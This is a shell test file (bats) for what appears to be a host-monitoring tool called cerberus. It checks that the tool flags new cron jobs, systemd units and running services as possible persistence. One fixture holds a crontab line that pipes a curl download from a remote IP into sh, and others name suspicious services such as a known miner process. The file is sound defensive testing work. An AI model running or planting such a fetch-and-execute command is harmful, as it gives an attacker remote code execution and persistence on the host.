#!/usr/bin/env bats
# lib/baseline.sh: the persistence snapshot and what counts as a change.

setup() {
  load helper
  cerberus_setup
  cerberus_load
  fixture crontab_out ""
  fixture systemctl_unit_files "ssh.service enabled"
  fixture systemctl_units_running "ssh.service"
}

@test "the first diff seeds the baseline instead of alerting on everything" {
  run baseline_diff
  [[ "$output" != *"SOFT|persistence"* ]]
  [ -f "$BASELINE_DIR/units" ]
}

@test "a new root cron entry is reported once the baseline exists" {
  baseline_build
  fixture crontab_out "*/5 * * * * curl -s http://198.51.100.9/x | sh"

  run baseline_diff
  [[ "$output" == *"SOFT|persistence|-|new in crontab:"* ]]
  [[ "$output" == *"198.51.100.9"* ]]
}

@test "a new systemd unit is reported" {
  baseline_build
  fixture systemctl_unit_files "ssh.service enabled" "evil.service enabled"

  run baseline_diff
  [[ "$output" == *"new in units: evil.service enabled"* ]]
}

@test "a newly running service is reported" {
  baseline_build
  fixture systemctl_units_running "ssh.service" "kdevtmpfsi.service"

  run baseline_diff
  [[ "$output" == *"new in units_running: kdevtmpfsi.service"* ]]
}

@test "removals are not reported -- cleanup is not a threat signal" {
  fixture crontab_out "0 3 * * * /usr/local/bin/backup" "0 4 * * * /usr/local/bin/report"
  baseline_build
  fixture crontab_out "0 3 * * * /usr/local/bin/backup"

  run baseline_diff
  [ -z "$output" ]
}

@test "an unchanged host produces no findings at all" {
  baseline_build
  run baseline_diff
  [ -z "$output" ]
}

@test "baseline_build reseeds, so re-baselining silences a reviewed change" {
  baseline_build
  fixture crontab_out "*/5 * * * * /usr/local/bin/new-legit-job"
  run baseline_diff
  [[ "$output" == *"new in crontab"* ]]

  baseline_build            # operator reviewed it and accepted it
  run baseline_diff
  [ -z "$output" ]
}

@test "detect_persistence only runs every PERSISTENCE_EVERY passes" {
  baseline_build
  fixture crontab_out "*/5 * * * * /tmp/x"
  PERSISTENCE_EVERY=10

  CERBERUS_PASS=3 run detect_persistence
  [ -z "$output" ]
  CERBERUS_PASS=10 run detect_persistence
  [[ "$output" == *"new in crontab"* ]]
}

@test "detect_persistence is disabled by DETECT_PERSISTENCE=0" {
  baseline_build
  fixture crontab_out "*/5 * * * * /tmp/x"
  DETECT_PERSISTENCE=0 CERBERUS_PASS=0 run detect_persistence
  [ -z "$output" ]
}
